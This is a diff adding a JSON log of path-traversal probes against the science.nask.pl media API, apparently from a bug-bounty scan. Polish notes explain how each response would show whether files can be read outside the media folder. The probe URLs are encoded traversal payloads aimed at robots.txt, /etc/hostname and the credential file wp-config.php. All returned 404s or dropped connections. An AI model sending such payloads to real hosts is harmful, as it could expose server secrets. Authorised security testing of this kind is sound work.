@@ -1,0 +1,197 @@
+{
+  "schema_version": 1,
+  "dry_run": false,
+  "rps_requested": 1.0,
+  "min_observed_gap_s": 1.0,
+  "wall_seconds": 6.55,
+  "count": 7,
+  "summary": {
+    "count": 7,
+    "verdicts": {
+      "transport-error": 3,
+      "not-found": 2,
+      "media-file": 1,
+      "public-root-file": 1
+    },
+    "candidates": [],
+    "transport_errors": [
+      "sci-H04-escape-literal-robots",
+      "sci-H05-escape-encoded-robots",
+      "sci-H07-escape-os-hostname"
+    ],
+    "out_of_scope_refusals": []
+  },
+  "identical_bodies": [],
+  "note": "Werdykt wynika z typu/rozmiaru/znacznikow, nie z samego kodu. CANDIDATE-* wymaga recznego potwierdzenia przez czlowieka przed jakimkolwiek zgloszeniem; tresci wrazliwe nie sa zapisywane.",
+  "probes": [
+    {
+      "id": "sci-H01-ctl-media-jpg",
+      "url": "https://science.nask.pl/api/media/wp-content/uploads/sites/4/2023/06/Struktura-s-e1687258346784.jpg",
+      "status": 200,
+      "reason": "OK",
+      "ms": 802,
+      "bytes_read": 65536,
+      "sha256": "febfe52454f36f418006bed26318c7865976e39d5c958cce02a1b45e757e3e02",
+      "content_type": "image/jpeg",
+      "headers": {
+        "content-type": "image/jpeg",
+        "cache-control": "public, max-age=86400",
+        "x-frame-options": "sameorigin"
+      },
+      "set_cookie_names": [
+        "stickounet"
+      ],
+      "markers": {
+        "JPEG_MAGIC": 1
+      },
+      "json_keys": {},
+      "secret_marker_hits": 0,
+      "preview": "......JFIF..............Exif..MM.*.......i...........................P...........d........27..........27......2023:01:27 12:59:16.2023:01:27 12:59:16.......http://ns.adobe.com/xap/1.0/.<?xpacket begin",
+      "error": null,
+      "verdict": "media-file",
+      "raw_path": "/api/media/wp-content/uploads/sites/4/2023/06/Struktura-s-e1687258346784.jpg",
+      "why": "KONTROLA referencyjna tego przebiegu (run1/run2: sha febfe524)."
+    },
+    {
+      "id": "sci-H02-robots-root-ctl",
+      "url": "https://science.nask.pl/robots.txt",
+      "status": 200,
+      "reason": "OK",
+      "ms": 753,
+      "bytes_read": 73,
+      "sha256": "43263c2a139e55feb8e34dce783b7ae29a932d1e3e9c6d7c91afb7da68c23c70",
+      "content_type": "text/plain",
+      "headers": {
+        "content-type": "text/plain; charset=UTF-8",
+        "content-length": "73",
+        "cache-control": "public, max-age=0",
+        "last-modified": "Wed, 28 Oct 2026 12:44:52 GMT",
+        "etag": "W/\"49-1a1828ab9a0\"",
+        "x-frame-options": "sameorigin"
+      },
+      "set_cookie_names": [
+        "stickounet"
+      ],
+      "markers": {},
+      "json_keys": {},
+      "secret_marker_hits": 0,
+      "preview": "User-agent: *.Disallow: /api/.Disallow: /_next/.Disallow: /node_modules/.",
+      "error": null,
+      "verdict": "public-root-file",
+      "raw_path": "/robots.txt",
+      "why": "KONTROLA celu ucieczki: robots.txt korzenia hosta. Bez jego skrotu nie da sie stwierdzic odczytu spoza poddrzewa mediow."
+    },
+    {
+      "id": "sci-H03-double-enc-dots-literal-slash",
+      "url": "https://science.nask.pl/api/media/wp-content/%252e%252e/wp-content/uploads/sites/4/2023/06/Struktura-s-e1687258346784.jpg",
+      "status": 404,
+      "reason": "Not Found",
+      "ms": 819,
+      "bytes_read": 0,
+      "sha256": null,
+      "content_type": null,
+      "headers": {},
+      "set_cookie_names": [
+        "stickounet"
+      ],
+      "markers": {},
+      "json_keys": {},
+      "secret_marker_hits": 0,
+      "preview": "",
+      "error": null,
+      "verdict": "not-found",
+      "raw_path": "/api/media/wp-content/%252e%252e/wp-content/uploads/sites/4/2023/06/Struktura-s-e1687258346784.jpg",
+      "why": "DYSKRYMINATOR warstwy: nginx dekoduje RAZ, wiec po jego stronie zostaje literal `%2e%2e` (nie segment `..`) i nie normalizuje. 200 + sha == H01 => to APLIKACJA dekoduje drugi raz i rozwija `..` (realny prymityw). 404 => G02 z run2 to normalizacja nginx, nie aplikacja."
+    },
+    {
+      "id": "sci-H04-escape-literal-robots",
+      "url": "https://science.nask.pl/api/media/%2e%2e/%2e%2e/%2e%2e/%2e%2e/robots.txt",
+      "status": null,
+      "reason": null,
+      "ms": 437,
+      "bytes_read": 0,
+      "sha256": null,
+      "content_type": null,
+      "headers": {},
+      "set_cookie_names": [],
+      "markers": {},
+      "json_keys": {},
+      "secret_marker_hits": 0,
+      "preview": null,
+      "error": "transport: RemoteDisconnected: Remote end closed connection without response",
+      "verdict": "transport-error",
+      "raw_path": "/api/media/%2e%2e/%2e%2e/%2e%2e/%2e%2e/robots.txt",
+      "why": "UCIECZKA z katalogu mediow, cel NIESZKODLIWY, separatory literalne. sha == H02 => odczyt pliku spoza poddrzewa mediow = path traversal/LFI (Tier 2 do 10 000 zl). 400 nginx => brzeg blokuje ucieczke (ochrona dziala). 404 => brak rozwijania."
+    },
+    {
+      "id": "sci-H05-escape-encoded-robots",
+      "url": "https://science.nask.pl/api/media/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2frobots.txt",
+      "status": null,
+      "reason": null,
+      "ms": 438,
+      "bytes_read": 0,
+      "sha256": null,
+      "content_type": null,
+      "headers": {},
+      "set_cookie_names": [],
+      "markers": {},
+      "json_keys": {},
+      "secret_marker_hits": 0,
+      "preview": null,
+      "error": "transport: RemoteDisconnected: Remote end closed connection without response",
+      "verdict": "transport-error",
+      "raw_path": "/api/media/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2frobots.txt",
+      "why": "Jak H04, ale separatory zakodowane (`%2f`) — run1 pokazal, ze ta postac NIE jest normalizowana przez nginx (A04 = 404), wiec dociera do aplikacji. Rozstrzyga, czy aplikacja sama rozwija zakodowany separator."
+    },
+    {
+      "id": "sci-H06-escape-3-wpconfig-secret",
+      "url": "https://science.nask.pl/api/media/wp-content/%2e%2e/%2e%2e/%2e%2e/wp-config.php",
+      "status": 404,
+      "reason": "Not Found",
+      "ms": 591,
+      "bytes_read": 17524,
+      "sha256": "d1f492620a552e95f029e5cce7ffd003719a049ec8d142637d6abe96571d2e70",
+      "content_type": "text/html",
+      "headers": {
+        "content-type": "text/html; charset=utf-8",
+        "content-length": "17524",
+        "cache-control": "private, no-cache, no-store, max-age=0, must-revalidate",
+        "etag": "\"leskqy5jkkdi5\""
+      },
+      "set_cookie_names": [
+        "stickounet"
+      ],
+      "markers": {
+        "HTML_DOC": 2,
+        "SPA_SHELL": 1
+      },
+      "json_keys": {},
+      "secret_marker_hits": 0,
+      "preview": null,
+      "error": null,
+      "verdict": "not-found",
+      "raw_path": "/api/media/wp-content/%2e%2e/%2e%2e/%2e%2e/wp-config.php",
+      "why": "Ucieczka 3 poziomy z separatorami literalnymi, cel wrazliwy (zapisujemy wylacznie metadane + male cialo bledu). Rozroznia 'nginx 400 na ucieczke' (jak run2 G04) od 'aplikacja 404'."
+    },
+    {
+      "id": "sci-H07-escape-os-hostname",
+      "url": "https://science.nask.pl/api/media/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hostname",
+      "status": null,
+      "reason": null,
+      "ms": 541,
+      "bytes_read": 0,
+      "sha256": null,
+      "content_type": null,
+      "headers": {},
+      "set_cookie_names": [],
+      "markers": {},
+      "json_keys": {},
+      "secret_marker_hits": 0,
+      "preview": null,
+      "error": "transport: RemoteDisconnected: Remote end closed connection without response",
+      "verdict": "transport-error",
+      "raw_path": "/api/media/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hostname",
+      "why": "Ostateczny test ucieczki do systemu plikow OS, cel NIESZKODLIWY (hostname), separatory LITERALNE (run1: `etc%2fhostname` dawal timeout, wiec zmieniamy postac). 200 z zawartoscia = LFI z odczytem (klasa platna §8). 400/404 = zamkniete."
+    }
+  ]
+}
